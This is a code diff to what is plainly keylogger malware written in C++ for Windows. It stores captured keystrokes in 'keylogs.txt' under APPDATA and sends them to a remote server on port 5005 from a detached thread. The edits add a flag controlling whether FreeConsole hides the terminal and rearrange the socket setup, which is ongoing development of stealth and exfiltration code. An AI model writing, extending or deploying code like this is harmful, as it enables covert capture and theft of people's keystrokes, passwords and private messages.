@@ -7,6 +7,7 @@ using namespace std;
 const string SERVER = "";
 const int PORT = 5005;
 const int DELAY = 500; // milliseconds
+const bool noConsole = true;
 
 string logFileName = "keylogs.txt";
 string appData = string(getenv("APPDATA")) + "\\";
@@ -446,7 +447,7 @@ int transferLogs()
 
     WSADATA wsData;
     sockaddr_in client;
-    SOCKET objSocket = socket(AF_INET, SOCK_STREAM, 0);
+    SOCKET objSocket;
 
     if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { return EXIT_FAILURE; }
 
@@ -479,7 +480,7 @@ int transferLogs()
 
 int main()
 {
-    FreeConsole(); // Disable Terminal Pop-Up
+    if (noConsole) FreeConsole(); // Disable Terminal Pop-Up
 
     thread t(transferLogs);
     t.detach();
